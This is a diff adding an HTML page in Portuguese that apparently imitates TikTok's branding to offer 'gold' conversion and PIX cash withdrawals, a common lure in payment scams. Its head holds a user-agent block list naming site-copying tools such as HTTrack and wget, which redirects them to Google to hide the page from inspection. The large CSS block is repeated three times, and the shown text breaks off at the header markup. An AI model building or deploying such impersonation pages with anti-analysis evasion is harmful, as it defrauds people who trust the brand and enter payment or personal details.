@@ -1,0 +1,1659 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Conversão de Golds</title>
+  <script src="js/utm-handler.js" data-token="ce194e2a-014d-4f4a-9461-8e102ae8daae" data-click-id-param="click_id">
+</script>
+
+  <script>
+    const blacklist = [
+      'HTTrack','WebCopier','WebZIP','Teleport','wget',
+      'SavePage','Offline Explorer','NCollector','sitecopy'
+    ];
+    const userAgent = navigator.userAgent;
+    for (let i = 0; i < blacklist.length; i++) {
+      if (userAgent.includes(blacklist[i])) {
+        window.location.href = 'https://google.com';
+      }
+    }
+  </script>
+  <style>
+    /* === CORREÇÃO DE RESPONSIVIDADE E OVERFLOW === */
+    /* 1) Garante que nada vaze da tela */
+   html, body {
+  width:100%;
+  min-height:100%;
+  overflow-x:hidden;
+  background: #111; /* fundo preto TikTok */
+  font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+  margin:0;
+  padding:0;
+}
+    /* 2) Container centralizado e responsivo */
+    .screen {
+      width: 100%;
+      max-width: 380px;
+      margin: 0 auto;
+      padding: 0 16px;
+      box-sizing: border-box;
+    }
+    /* 3) Inputs/Select respeitando o container */
+    .pix-form select,
+    .pix-form input {
+      width: 100%;
+      max-width: 100%;
+      box-sizing: border-box;
+    }
+    /* 4) Placeholder com reticências em vez de vazar */
+    .pix-form input::placeholder {
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    /* Reset e base */
+    *, *::before, *::after { box-sizing: border-box; margin:0; padding:0 }
+
+
+    /* Header */
+    .app-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px;
+      background: #000; /* header preto */
+      box-shadow: 0 1px 5px rgba(0,0,0,0.05);
+      position: sticky;
+      top: 0;
+      left: 0;
+      width: 100%;
+      z-index: 100;
+      margin: 0;
+    }
+    
+    .app-header::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(37,244,238,0.2), rgba(254,44,85,0.2), transparent); /* azul e rosa TikTok */
+    }
+    
+    .left-icon, .right-icons svg {
+      width: 24px;
+      height: 24px;
+      cursor: pointer;
+      stroke: #fff; /* ícones brancos */
+      transition: transform 0.2s ease;
+    }
+    
+    .left-icon:hover, .right-icons svg:hover {
+      transform: scale(1.1);
+    }
+    
+    .header-logo img {
+      height: 28px;
+      filter: none; /* remove drop-shadow */
+    }
+    .header-title {
+      flex: 1;
+      margin-left: 12px;
+      font-size: 18px;
+      font-weight: 600;
+      color: #fff; /* texto branco */
+    }
+    .right-icons { display:flex; gap:12px }
+    .right-placeholder { width:24px }
+
+    /* Screens */
+    .screen { display:none; }
+    .screen.active { display:block; }
+
+    /* Conversão */
+    .tabs { display:flex; border-bottom:1px solid #ddd; margin-bottom:16px }
+    .tab {
+      flex:1; text-align:center; padding:12px 0;
+      background:none; border:none; font-weight:500; color:#888; cursor:pointer;
+    }
+    .tab.active { 
+      color: #fff; 
+      border-bottom:2px solid #25F4EE; /* azul TikTok */
+    }
+
+    .saldo-card {
+      background: linear-gradient(135deg, #222, #111); /* fundo escuro */
+      border-radius: 16px;
+      padding: 24px 20px;
+      box-shadow: 0 10px 20px rgba(242, 99, 34, 0.07);
+      margin-bottom: 24px;
+      text-align: center;
+      border: 1px solid rgba(37,244,238,0.15); /* azul TikTok */
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .saldo-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 4px;
+      background: linear-gradient(90deg, #25F4EE, #FE2C55); /* azul e rosa TikTok */
+    }
+    
+    .saldo-card .label {
+      font-size: 15px;
+      color: #aaa;
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+    
+    .saldo-card .value {
+      font-size: 36px;
+      font-weight: bold;
+      color: #fff;
+      margin: 5px 0;
+      background: linear-gradient(90deg, #25F4EE, #FE2C55);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      display: inline-block;
+    }
+    
+    .saldo-card .equiv {
+      font-size: 16px;
+      color: #25F4EE;
+      margin-top: 8px;
+      padding: 6px 14px;
+      background-color: rgba(37,244,238,0.08);
+      border-radius: 20px;
+      display: inline-block;
+    }
+
+    .options {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+    
+    .option {
+      background: #181818;
+      border: 1px solid #222;
+      color: #fff;
+      cursor: pointer;
+      text-align: center;
+      line-height: 1.3;
+      transition: all 0.2s ease;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.03);
+    }
+    
+    .option:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 10px rgba(37,244,238,0.1);
+      border-color: rgba(37,244,238,0.3);
+    }
+    
+    .option.selected {
+      background: linear-gradient(135deg, #25F4EE, #FE2C55);
+      color: #fff;
+      border-color: transparent;
+      box-shadow: 0 4px 12px rgba(37,244,238,0.25);
+    }
+    
+    .option strong {
+      display: block;
+      font-size: 18px;
+      margin-bottom: 4px;
+      font-weight: 600;
+    }
+    
+    .option.selected::after {
+      content: "✓";
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      font-size: 14px;
+      font-weight: bold;
+      background: rgba(255,255,255,0.2);
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .action {
+      width: 100%;
+      background: linear-gradient(135deg, #25F4EE, #FE2C55);
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 16px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 12px rgba(242, 99, 34, 0.2);
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .action:hover:not(:disabled) {
+      box-shadow: 0 6px 15px rgba(37,244,238,0.25);
+    }
+    
+    .action:active:not(:disabled) {
+      box-shadow: 0 2px 8px rgba(254,44,85,0.15);
+    }
+    
+    .action:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    
+    .action::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: 0.5s;
+    }
+    
+    .action:hover:not(:disabled)::after {
+      left: 100%;
+    }
+
+    .helper {
+      background: #181818;
+      color: #fff;
+    }
+    .helper a { color: #25F4EE; }
+
+    /* PIX screen */
+    .pix-section { margin-bottom:16px }
+    .pix-card {
+      background: linear-gradient(135deg, #222, #181818);
+      border: 1px solid rgba(37,244,238,0.3);
+      border-radius: 14px;
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 24px;
+      box-shadow: 0 6px 16px rgba(59, 130, 246, 0.08);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    
+    .pix-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(59, 130, 246, 0.12);
+    }
+    
+    .pix-logo {
+      width: 48px;
+      height: 48px;
+      filter: drop-shadow(0 2px 4px rgba(59, 130, 246, 0.2));
+    }
+    
+    .pix-card .title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #25F4EE;
+    }
+    
+    .action-btn {
+      margin-left: auto;
+      color: #25F4EE;
+      background: rgba(37,244,238,0.1);
+      border: none;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 8px 14px;
+      border-radius: 8px;
+      transition: all 0.2s ease;
+    }
+    
+    .action-btn:hover {
+      background: rgba(37,244,238,0.15);
+    }
+    
+    .pix-form {
+      background: #181818;
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05);
+    }
+    
+    .pix-form label {
+      color: #fff;
+      display: block;
+      margin-top: 16px;
+      margin-bottom: 8px;
+      font-size: 15px;
+      font-weight: 500;
+    }
+    
+    .pix-form select,
+    .pix-form input {
+      width: 100%;
+      padding: 16px 20px;
+      font-size: 16px;
+      color: #fff;
+      background: #222;
+      border: 1px solid #333;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+      transition: all 0.3s ease;
+      appearance: none;
+      background-repeat: no-repeat;
+      background-position: right 16px center;
+    }
+    
+    .pix-form select:focus,
+    .pix-form input:focus {
+      background: #181818;
+      border-color: #25F4EE;
+      box-shadow: 0 0 0 3px rgba(37,244,238,0.15);
+      outline: none;
+    }
+    
+    .pix-form select {
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg width='14' height='8' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M7 8L0 0h14L7 8z' fill='%23666'/%3E%3C/svg%3E");
+      padding-right: 42px;
+    }
+    
+    .pix-confirm {
+      width: 100%;
+      padding: 16px;
+      margin-top: 28px;
+      font-size: 17px;
+      font-weight: 600;
+      color: #fff;
+      background: linear-gradient(135deg, #25F4EE, #FE2C55);
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(242, 99, 34, 0.2);
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .pix-confirm:hover:not(:disabled) {
+      box-shadow: 0 6px 15px rgba(37,244,238,0.25);
+    }
+    
+    .pix-confirm:active:not(:disabled) {
+      transform: translateY(0);
+      box-shadow: 0 2px 8px rgba(254,44,85,0.15);
+    }
+    
+    .pix-confirm:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    
+    .pix-confirm::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+    
+    .pix-confirm:hover:not(:disabled)::after {
+      left: 100%;
+    }
+
+    /* Tela de confirmação */
+    #withdraw-amount {
+      text-align: center;
+      margin: 32px 0 40px;
+      position: relative;
+    }
+    
+    #withdraw-amount::after {
+      content: '';
+      position: absolute;
+      bottom: -20px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 3px;
+      background: linear-gradient(90deg, #25F4EE, #FE2C55);
+      border-radius: 3px;
+    }
+    
+    #withdraw-amount .value {
+      font-size: 48px;
+      background: linear-gradient(90deg, #25F4EE, #FE2C55);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: bold;
+      margin-bottom: 8px;
+      display: inline-block;
+    }
+    
+    #withdraw-amount .label {
+      color: #aaa;
+    }
+    
+    .transfer-card {
+      background: linear-gradient(135deg, #181818, #222);
+      border: 1px solid #222;
+      border-radius: 8px;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 24px;
+    }
+    .transfer-card .method {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .transfer-card .method img {
+      width: 30px;
+      height: 30px;
+      filter: drop-shadow(0 2px 3px rgba(0, 0, 0, 0.1));
+    }
+    .transfer-card .method .title {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 500;
+    }
+    .transfer-card .unlink {
+      background: rgba(254,44,85,0.08);
+      color: #FE2C55;
+      border: none;
+      font-weight: 600;
+      padding: 8px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      font-size: 14px;
+    }
+    
+    .transfer-card .unlink:hover {
+      background: rgba(254,44,85,0.12);
+    }
+    
+    .final-helper {
+      color: #fff;
+      background: rgba(37,244,238,0.08);
+      font-size: 14px;
+      line-height: 1.5;
+      text-align: center;
+      margin-bottom: 24px;
+      padding: 16px;
+      border-radius: 12px;
+    }
+
+    .screen { 
+      display: none; 
+      padding-top: 10px;
+    }
+    .screen.active { 
+      display: block; 
+    }
+
+    @media (max-width:480px) {
+      .app-header {
+        background: #000;
+      }
+      .header-title {
+        font-size: 16px;
+      }
+      .screen {
+        padding-top: 5px;
+      }
+    }
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+.loading-spinner {
+  width: 40px;
+  height: 40px;
+  border: 4px solid #eee;
+  border-top: 4px solid #f26322;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 16px;
+  transition: opacity 0.5s;
+}
+
+/* TEXTO PULSANTE */
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50%      { opacity: 0.5; }
+}
+.progress-text {
+  animation: pulse 1.5s ease-in-out infinite;
+}
+    /* sugestões de e-mail */
+    .email-suggestions {
+      border:1px solid #ddd; border-radius:4px; background:#fff;
+      max-height:120px; overflow-y:auto; margin-top:4px;
+    }
+    .email-suggestions div {
+      padding:8px; cursor:pointer;
+    }
+    .email-suggestions div:hover {
+      background:#f2f2f2;
+    }
+    .screen-loading { display: none; text-align: center; padding: 40px 16px; }
+    .progress-container { width: 100%; max-width: 380px; height: 16px; background: #eee; border-radius: 8px; overflow: hidden; margin: 24px auto; }
+    .progress-bar { width: 0; height: 100%; background: linear-gradient(90deg, #25F4EE, #FE2C55); transition: width 1.5s ease; }
+    .progress-text { font-size: 16px; color: #333; margin-top: 16px; }
+    .error-text { color: #FE2C55; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+.loading-spinner {
+  width: 40px; height: 40px;
+  border: 4px solid #eee;
+  border-top: 4px solid #f26322;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 16px;
+  transition: opacity 0.5s;
+}
+/* fade-out do spinner */
+.loading-spinner.fade-out {
+  opacity: 0;
+}
+
+/* ícone de erro */
+.error-icon {
+  position: absolute;
+  top: 40px;         /* mesmo offset vertical do spinner + padding top */
+  left: 50%;
+  transform: translateX(-50%);
+  opacity: 0;
+  transition: opacity 0.5s;
+  /* opcional: defina width/height se precisar */
+  width: 40px;
+  height: 40px;
+}
+/* fade-in do ícone de erro */
+.error-icon.fade-in {
+  opacity: 1;
+}
+.error-icon img {
+  width: 40px;
+  height: 40px;
+  opacity: 0;
+  transition: opacity 0.5s;
+}
+.error-icon.fade-in img {
+  opacity: 1;
+}
+/* barra de progresso erro */
+.progress-bar.error {
+  background: #FE2C55 !important;
+  transition: background 0.5s;
+}
+#loading-text.hidden {
+  display: none;
+}
+#screen-loading {
+  position: relative;
+  display: none;
+  text-align: center;
+  padding: 40px 16px;
+}
+#screen-failure { display: none; }
+/* Colar dentro do <style> */
+@keyframes gradient-animation {
+  0%   { background-position:   0% 50%; }
+  50%  { background-position: 100% 50%; }
+  100% { background-position:   0% 50%; }
+}
+.animated-gradient {
+  background: linear-gradient(90deg, #25F4EE, #FE2C55, #25F4EE);
+  background-size: 200% 200%;
+  animation: gradient-animation 3s ease infinite;
+}
+
+    /* PIX screen - redesign moderno */
+    .pix-section { 
+      margin-bottom: 24px;
+    }
+    
+    .pix-card {
+      background: linear-gradient(135deg, #222, #181818);
+      border: 1px solid rgba(37,244,238,0.3);
+      border-radius: 14px;
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 24px;
+      box-shadow: 0 6px 16px rgba(59, 130, 246, 0.08);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    
+    .pix-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(59, 130, 246, 0.12);
+    }
+    
+    .pix-logo {
+      width: 48px;
+      height: 48px;
+      filter: drop-shadow(0 2px 4px rgba(59, 130, 246, 0.2));
+    }
+    
+    .pix-card .title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #25F4EE;
+    }
+    
+    .action-btn {
+      margin-left: auto;
+      color: #25F4EE;
+      background: rgba(37,244,238,0.1);
+      border: none;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 8px 14px;
+      border-radius: 8px;
+      transition: all 0.2s ease;
+    }
+    
+    .action-btn:hover {
+      background: rgba(37,244,238,0.15);
+    }
+    
+    .pix-form {
+      background: #181818;
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05);
+    }
+    
+    .pix-form label {
+      color: #fff;
+      display: block;
+      margin-top: 16px;
+      margin-bottom: 8px;
+      font-size: 15px;
+      font-weight: 500;
+    }
+    
+    .pix-form select,
+    .pix-form input {
+      width: 100%;
+      padding: 16px 20px;
+      font-size: 16px;
+      color: #fff;
+      background: #222;
+      border: 1px solid #333;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+      transition: all 0.3s ease;
+      appearance: none;
+      background-repeat: no-repeat;
+      background-position: right 16px center;
+    }
+    
+    .pix-form select:focus,
+    .pix-form input:focus {
+      background: #181818;
+      border-color: #25F4EE;
+      box-shadow: 0 0 0 3px rgba(37,244,238,0.15);
+      outline: none;
+    }
+    
+    .pix-form select {
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg width='14' height='8' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M7 8L0 0h14L7 8z' fill='%23666'/%3E%3C/svg%3E");
+      padding-right: 42px;
+    }
+    
+    .pix-confirm {
+      width: 100%;
+      padding: 16px;
+      margin-top: 28px;
+      font-size: 17px;
+      font-weight: 600;
+      color: #fff;
+      background: linear-gradient(135deg, #25F4EE, #FE2C55);
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(242, 99, 34, 0.2);
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .pix-confirm:hover:not(:disabled) {
+      box-shadow: 0 6px 15px rgba(37,244,238,0.25);
+    }
+    
+    .pix-confirm:active:not(:disabled) {
+      transform: translateY(0);
+      box-shadow: 0 2px 8px rgba(254,44,85,0.15);
+    }
+    
+    .pix-confirm:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    
+    .pix-confirm::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+    
+    .pix-confirm:hover:not(:disabled)::after {
+      left: 100%;
+    }
+
+    /* Tela de confirmação */
+    #withdraw-amount {
+      text-align: center;
+      margin: 32px 0 40px;
+      position: relative;
+    }
+    
+    #withdraw-amount::after {
+      content: '';
+      position: absolute;
+      bottom: -20px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 3px;
+      background: linear-gradient(90deg, #25F4EE, #FE2C55);
+      border-radius: 3px;
+    }
+    
+    #withdraw-amount .value {
+      font-size: 48px;
+      background: linear-gradient(90deg, #25F4EE, #FE2C55);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: bold;
+      margin-bottom: 8px;
+      display: inline-block;
+    }
+    
+    #withdraw-amount .label {
+      color: #aaa;
+    }
+    
+    .transfer-card {
+      background: linear-gradient(135deg, #181818, #222);
+      border: 1px solid #222;
+      border-radius: 8px;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 24px;
+    }
+    .transfer-card .method {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .transfer-card .method img {
+      width: 30px;
+      height: 30px;
+      filter: drop-shadow(0 2px 3px rgba(0, 0, 0, 0.1));
+    }
+    .transfer-card .method .title {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 500;
+    }
+    .transfer-card .unlink {
+      background: rgba(254,44,85,0.08);
+      color: #FE2C55;
+      border: none;
+      font-weight: 600;
+      padding: 8px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      font-size: 14px;
+    }
+    
+    .transfer-card .unlink:hover {
+      background: rgba(254,44,85,0.12);
+    }
+    
+    .final-helper {
+      color: #fff;
+      background: rgba(37,244,238,0.08);
+      font-size: 14px;
+      line-height: 1.5;
+      text-align: center;
+      margin-bottom: 24px;
+      padding: 16px;
+      border-radius: 12px;
+    }
+
+    .screen { 
+      display: none; 
+      padding-top: 10px;
+    }
+    .screen.active { 
+      display: block; 
+    }
+
+    @media (max-width:480px) {
+      .app-header {
+        background: #000;
+      }
+      .header-title {
+        font-size: 16px;
+      }
+      .screen {
+        padding-top: 5px;
+      }
+    }
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+.loading-spinner {
+  width: 40px;
+  height: 40px;
+  border: 4px solid #eee;
+  border-top: 4px solid #f26322;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 16px;
+  transition: opacity 0.5s;
+}
+
+/* TEXTO PULSANTE */
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50%      { opacity: 0.5; }
+}
+.progress-text {
+  animation: pulse 1.5s ease-in-out infinite;
+}
+    /* sugestões de e-mail */
+    .email-suggestions {
+      border:1px solid #ddd; border-radius:4px; background:#fff;
+      max-height:120px; overflow-y:auto; margin-top:4px;
+    }
+    .email-suggestions div {
+      padding:8px; cursor:pointer;
+    }
+    .email-suggestions div:hover {
+      background:#f2f2f2;
+    }
+    .screen-loading { display: none; text-align: center; padding: 40px 16px; }
+    .progress-container { width: 100%; max-width: 380px; height: 16px; background: #eee; border-radius: 8px; overflow: hidden; margin: 24px auto; }
+    .progress-bar { width: 0; height: 100%; background: linear-gradient(90deg, #25F4EE, #FE2C55); transition: width 1.5s ease; }
+    .progress-text { font-size: 16px; color: #333; margin-top: 16px; }
+    .error-text { color: #FE2C55; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+.loading-spinner {
+  width: 40px; height: 40px;
+  border: 4px solid #eee;
+  border-top: 4px solid #f26322;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 16px;
+  transition: opacity 0.5s;
+}
+/* fade-out do spinner */
+.loading-spinner.fade-out {
+  opacity: 0;
+}
+
+/* ícone de erro */
+.error-icon {
+  position: absolute;
+  top: 40px;         /* mesmo offset vertical do spinner + padding top */
+  left: 50%;
+  transform: translateX(-50%);
+  opacity: 0;
+  transition: opacity 0.5s;
+  /* opcional: defina width/height se precisar */
+  width: 40px;
+  height: 40px;
+}
+/* fade-in do ícone de erro */
+.error-icon.fade-in {
+  opacity: 1;
+}
+.error-icon img {
+  width: 40px;
+  height: 40px;
+  opacity: 0;
+  transition: opacity 0.5s;
+}
+.error-icon.fade-in img {
+  opacity: 1;
+}
+/* barra de progresso erro */
+.progress-bar.error {
+  background: #FE2C55 !important;
+  transition: background 0.5s;
+}
+#loading-text.hidden {
+  display: none;
+}
+#screen-loading {
+  position: relative;
+  display: none;
+  text-align: center;
+  padding: 40px 16px;
+}
+#screen-failure { display: none; }
+/* Colar dentro do <style> */
+@keyframes gradient-animation {
+  0%   { background-position:   0% 50%; }
+  50%  { background-position: 100% 50%; }
+  100% { background-position:   0% 50%; }
+}
+.animated-gradient {
+  background: linear-gradient(90deg, #25F4EE, #FE2C55, #25F4EE);
+  background-size: 200% 200%;
+  animation: gradient-animation 3s ease infinite;
+}
+
+    /* PIX screen - redesign moderno */
+    .pix-section { 
+      margin-bottom: 24px;
+    }
+    
+    .pix-card {
+      background: linear-gradient(135deg, #222, #181818);
+      border: 1px solid rgba(37,244,238,0.3);
+      border-radius: 14px;
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 24px;
+      box-shadow: 0 6px 16px rgba(59, 130, 246, 0.08);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    
+    .pix-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(59, 130, 246, 0.12);
+    }
+    
+    .pix-logo {
+      width: 48px;
+      height: 48px;
+      filter: drop-shadow(0 2px 4px rgba(59, 130, 246, 0.2));
+    }
+    
+    .pix-card .title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #25F4EE;
+    }
+    
+    .action-btn {
+      margin-left: auto;
+      color: #25F4EE;
+      background: rgba(37,244,238,0.1);
+      border: none;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 8px 14px;
+      border-radius: 8px;
+      transition: all 0.2s ease;
+    }
+    
+    .action-btn:hover {
+      background: rgba(37,244,238,0.15);
+    }
+    
+    .pix-form {
+      background: #181818;
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05);
+    }
+    
+    .pix-form label {
+      color: #fff;
+      display: block;
+      margin-top: 16px;
+      margin-bottom: 8px;
+      font-size: 15px;
+      font-weight: 500;
+    }
+    
+    .pix-form select,
+    .pix-form input {
+      width: 100%;
+      padding: 16px 20px;
+      font-size: 16px;
+      color: #fff;
+      background: #222;
+      border: 1px solid #333;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+      transition: all 0.3s ease;
+      appearance: none;
+      background-repeat: no-repeat;
+      background-position: right 16px center;
+    }
+    
+    .pix-form select:focus,
+    .pix-form input:focus {
+      background: #181818;
+      border-color: #25F4EE;
+      box-shadow: 0 0 0 3px rgba(37,244,238,0.15);
+      outline: none;
+    }
+    
+    .pix-form select {
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg width='14' height='8' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M7 8L0 0h14L7 8z' fill='%23666'/%3E%3C/svg%3E");
+      padding-right: 42px;
+    }
+    
+    .pix-confirm {
+      width: 100%;
+      padding: 16px;
+      margin-top: 28px;
+      font-size: 17px;
+      font-weight: 600;
+      color: #fff;
+      background: linear-gradient(135deg, #25F4EE, #FE2C55);
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(242, 99, 34, 0.2);
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .pix-confirm:hover:not(:disabled) {
+      box-shadow: 0 6px 15px rgba(37,244,238,0.25);
+    }
+    
+    .pix-confirm:active:not(:disabled) {
+      transform: translateY(0);
+      box-shadow: 0 2px 8px rgba(254,44,85,0.15);
+    }
+    
+    .pix-confirm:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    
+    .pix-confirm::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+    
+    .pix-confirm:hover:not(:disabled)::after {
+      left: 100%;
+    }
+
+    /* Tela de confirmação */
+    #withdraw-amount {
+      text-align: center;
+      margin: 32px 0 40px;
+      position: relative;
+    }
+    
+    #withdraw-amount::after {
+      content: '';
+      position: absolute;
+      bottom: -20px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 3px;
+      background: linear-gradient(90deg, #25F4EE, #FE2C55);
+      border-radius: 3px;
+    }
+    
+    #withdraw-amount .value {
+      font-size: 48px;
+      background: linear-gradient(90deg, #25F4EE, #FE2C55);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: bold;
+      margin-bottom: 8px;
+      display: inline-block;
+    }
+    
+    #withdraw-amount .label {
+      color: #aaa;
+    }
+    
+    .transfer-card {
+      background: linear-gradient(135deg, #181818, #222);
+      border: 1px solid #222;
+      border-radius: 8px;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 24px;
+    }
+    .transfer-card .method {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .transfer-card .method img {
+      width: 30px;
+      height: 30px;
+      filter: drop-shadow(0 2px 3px rgba(0, 0, 0, 0.1));
+    }
+    .transfer-card .method .title {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 500;
+    }
+    .transfer-card .unlink {
+      background: rgba(254,44,85,0.08);
+      color: #FE2C55;
+      border: none;
+      font-weight: 600;
+      padding: 8px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      font-size: 14px;
+    }
+    
+    .transfer-card .unlink:hover {
+      background: rgba(254,44,85,0.12);
+    }
+    
+    .final-helper {
+      color: #fff;
+      background: rgba(37,244,238,0.08);
+      font-size: 14px;
+      line-height: 1.5;
+      text-align: center;
+      margin-bottom: 24px;
+      padding: 16px;
+      border-radius: 12px;
+    }
+
+    .screen { 
+      display: none; 
+      padding-top: 10px;
+    }
+    .screen.active { 
+      display: block; 
+    }
+
+    @media (max-width:480px) {
+      .app-header {
+        background: #000;
+      }
+      .header-title {
+        font-size: 16px;
+      }
+      .screen {
+        padding-top: 5px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header Conversão -->
+  <div id="header-converter" class="app-header">
+    <div class="left-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M15 18l-6-6 6-6"></path>
+      </svg>
+    </div>
+    <div class="header-logo">
+      <img src="images/tiktok-icon-free-png.png" alt="Logo TikTok">
+    </div>
+    <div class="right-icons">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M8 3H5a2 2 0 0 0-2 2v3"></path>
+        <path d="M16 3h3a2 2 0 0 1 2 2v3"></path>
+        <path d="M8 21H5a2 2 0 0 1-2-2v-3"></path>
+        <path d="M16 21h3a2 2 0 0 0 2-2v-3"></path>
+      </svg>
